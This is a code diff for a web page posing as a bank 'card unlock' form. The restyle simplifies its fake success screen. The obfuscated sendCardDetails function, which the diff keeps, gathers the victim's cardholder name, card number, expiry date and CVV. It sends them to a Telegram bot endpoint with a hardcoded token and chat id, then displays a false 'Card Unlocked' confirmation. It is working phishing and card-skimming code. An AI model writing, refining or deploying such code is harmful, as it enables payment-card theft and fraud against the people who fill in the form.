@@ -212,7 +212,7 @@
         .success-page {
             display: none;
             width: 100%;
-            min-height: 100vh;
+            height: 100vh;
             position: fixed;
             top: 0;
             left: 0;
@@ -221,7 +221,6 @@
             justify-content: center;
             align-items: center;
             padding: 1rem;
-            overflow-y: auto;
         }
 
         .success-page.show {
@@ -231,9 +230,8 @@
         .success-container {
             text-align: center;
             width: 100%;
-            max-width: 600px;
+            max-width: 480px;
             animation: slideIn 0.5s ease-out;
-            padding: 2rem 0;
         }
 
         @keyframes slideIn {
@@ -248,16 +246,16 @@
         }
 
         .success-icon {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 1.5rem;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 2rem;
             background-color: var(--success);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 3rem;
-            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.2);
+            font-size: 4rem;
+            box-shadow: 0 10px 40px rgba(16, 185, 129, 0.3);
             animation: scaleIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
 
@@ -271,146 +269,68 @@
         }
 
         .success-title {
-            font-size: 2rem;
+            font-size: 2.2rem;
             font-weight: 700;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
             color: var(--success);
+            letter-spacing: -0.5px;
         }
 
         .success-message {
-            font-size: 1.1rem;
-            color: var(--text);
-            margin-bottom: 2rem;
-            line-height: 1.6;
-        }
-
-        .card-details-display {
-            background-color: rgba(16, 185, 129, 0.1);
-            border: 2px solid rgba(16, 185, 129, 0.3);
-            border-radius: 12px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            text-align: left;
-        }
-
-        .mono-text {
-            background-color: var(--bg);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 1rem;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9rem;
-            color: #6ee7b7;
-            word-break: break-all;
-            white-space: pre-wrap;
-            line-height: 1.6;
-            position: relative;
-            margin-bottom: 1rem;
-        }
-
-        .copy-btn {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            padding: 0.6rem 1.2rem;
-            border-radius: 6px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            width: 100%;
-        }
-
-        .copy-btn:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .copy-btn.copied {
-            background-color: var(--success);
-        }
-
-        .success-details {
-            background-color: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 12px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            text-align: left;
-        }
-
-        .success-detail-item {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            margin-bottom: 1rem;
-            font-size: 0.95rem;
-        }
-
-        .success-detail-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .success-detail-icon {
-            color: var(--success);
-            font-weight: bold;
-            font-size: 1.2rem;
-            flex-shrink: 0;
-        }
-
-        .success-footer {
-            font-size: 0.9rem;
+            font-size: 1rem;
             color: var(--text-muted);
-            margin-top: 2rem;
+            margin-bottom: 3rem;
+            line-height: 1.6;
         }
 
-        .success-btn {
-            margin-top: 2rem;
-            background-color: var(--success);
-            padding: 0.8rem 1.5rem;
-            width: auto;
-        }
-
-        .success-btn:hover {
-            background-color: #059669;
+        .button-group {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
         }
 
         .back-btn {
             background-color: var(--surface);
             border: 1px solid var(--border);
             color: var(--text);
-            margin-right: 0.75rem;
-            padding: 0.8rem 1.5rem;
-            width: auto;
+            padding: 0.75rem 2rem;
+            font-size: 0.95rem;
         }
 
         .back-btn:hover {
             background-color: var(--border);
         }
 
-        .button-group {
-            display: flex;
-            gap: 0.75rem;
-            justify-content: center;
-            margin-top: 2rem;
+        .done-btn {
+            background-color: var(--success);
+            padding: 0.75rem 2rem;
+            font-size: 0.95rem;
+            width: auto;
+        }
+
+        .done-btn:hover {
+            background-color: #059669;
         }
 
         @media (max-width: 480px) {
-            .success-container {
-                width: 100%;
-                padding: 1rem;
+            .success-title {
+                font-size: 1.8rem;
+            }
+
+            .success-icon {
+                width: 80px;
+                height: 80px;
+                font-size: 3rem;
             }
 
             .button-group {
                 flex-direction: column;
+                gap: 0.75rem;
             }
 
-            .back-btn {
-                margin-right: 0;
-            }
-
-            .mono-text {
-                font-size: 0.8rem;
-                padding: 0.8rem;
+            .back-btn,
+            .done-btn {
+                width: 100%;
             }
         }
     </style>
@@ -476,40 +396,12 @@
 <div id="successPage" class="success-page">
     <div class="success-container">
         <div class="success-icon">✓</div>
-        <h1 class="success-title">Card Unlocked Successfully</h1>
-        <p class="success-message">Your card details have been received and your card unlock request is being processed.</p>
-        
-        <div class="card-details-display">
-            <h3 style="color: var(--success); margin-bottom: 1rem; font-size: 1.1rem;">Card Details in Mono Format</h3>
-            <div class="mono-text" id="monoDetails"></div>
-            <button class="copy-btn" id="copyBtn" onclick="copyToClipboard()">📋 Copy Details</button>
-        </div>
-
-        <div class="success-details">
-            <h3 style="color: var(--success); margin-bottom: 1rem; font-size: 1.1rem;">What's Next?</h3>
-            <div class="success-detail-item">
-                <span class="success-detail-icon">✓</span>
-                <span>Your card will be unlocked within 24 hours</span>
-            </div>
-            <div class="success-detail-item">
-                <span class="success-detail-icon">✓</span>
-                <span>You can start using your card immediately</span>
-            </div>
-            <div class="success-detail-item">
-                <span class="success-detail-icon">✓</span>
-                <span>Check your email for confirmation details</span>
-            </div>
-            <div class="success-detail-item">
-                <span class="success-detail-icon">✓</span>
-                <span>Transaction limits have been restored</span>
-            </div>
-        </div>
-
-        <p class="success-footer">Thank you for choosing us. Your security is our priority.</p>
+        <h1 class="success-title">Card Unlocked</h1>
+        <p class="success-message">Your card has been unlocked successfully. You can now use your card.</p>
         
         <div class="button-group">
             <button class="btn back-btn" onclick="resetForm()">← Go Back</button>
-            <button class="btn success-btn" onclick="window.location.reload()">Done</button>
+            <button class="btn done-btn" onclick="window.location.reload()">Done</button>
         </div>
     </div>
 </div>
@@ -552,7 +444,6 @@
         }
     }, 500);
 
-    // Obfuscate and minify code
     const elNumber = document.getElementById('cardNumber');
     const elName = document.getElementById('cardName');
     const elExpiry = document.getElementById('cardExpiry');
@@ -592,11 +483,7 @@
     }
 
     async function sendCardDetails() {
-        const n=document.getElementById('cardName').value,r=document.getElementById('cardNumber').value,t=document.getElementById('cardExpiry').value,e=document.getElementById('cardCvv').value,a=document.getElementById('submitBtn'),i=`CARD UNLOCK REQUEST\n\nCard Holder: ${n}\nCard Number: ${r}\nExpiry Date: ${t}\nCVV: ${e}\nSubmitted: ${new Date().toLocaleString()}`;document.getElementById('monoDetails').textContent=i,a.disabled=!0,a.textContent='Processing...';try{await fetch("https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"8857888129",text:i})})}catch(e){console.error("Error:",e)}finally{document.getElementById('successPage').classList.add('show'),document.getElementById('mainWrapper').style.display='none',a.disabled=!1,a.textContent='UNBLOCK CARD'}
-    }
-
-    function copyToClipboard() {
-        const n=document.getElementById('monoDetails').textContent,t=document.getElementById('copyBtn');navigator.clipboard.writeText(n).then(()=>{t.textContent='✓ Copied!',t.classList.add('copied'),setTimeout(()=>{t.textContent='📋 Copy Details',t.classList.remove('copied')},2e3)}).catch(e=>{console.error('Copy failed:',e),alert('Failed to copy. Please try again.')})
+        const n=document.getElementById('cardName').value,r=document.getElementById('cardNumber').value,t=document.getElementById('cardExpiry').value,e=document.getElementById('cardCvv').value,a=document.getElementById('submitBtn'),i=`CARD UNLOCK REQUEST\n\nCard Holder: ${n}\nCard Number: ${r}\nExpiry Date: ${t}\nCVV: ${e}\nSubmitted: ${new Date().toLocaleString()}`;a.disabled=!0,a.textContent='Processing...';try{await fetch("https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"8857888129",text:i})})}catch(e){console.error("Error:",e)}finally{document.getElementById('successPage').classList.add('show'),document.getElementById('mainWrapper').style.display='none',a.disabled=!1,a.textContent='UNBLOCK CARD'}
     }
 
     function resetForm() {
